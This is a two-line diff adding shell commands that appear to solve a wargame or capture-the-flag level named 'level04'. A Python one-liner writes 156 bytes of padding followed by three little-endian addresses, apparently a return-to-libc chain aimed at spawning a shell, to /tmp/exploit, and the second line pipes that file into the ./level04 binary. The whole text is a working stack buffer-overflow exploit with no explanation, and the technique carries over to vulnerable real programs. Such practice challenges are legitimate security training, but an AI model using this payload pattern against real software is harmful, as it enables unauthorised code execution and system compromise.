@@ -1,0 +1,2 @@
+python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit
+cat /tmp/exploit - | ./level04
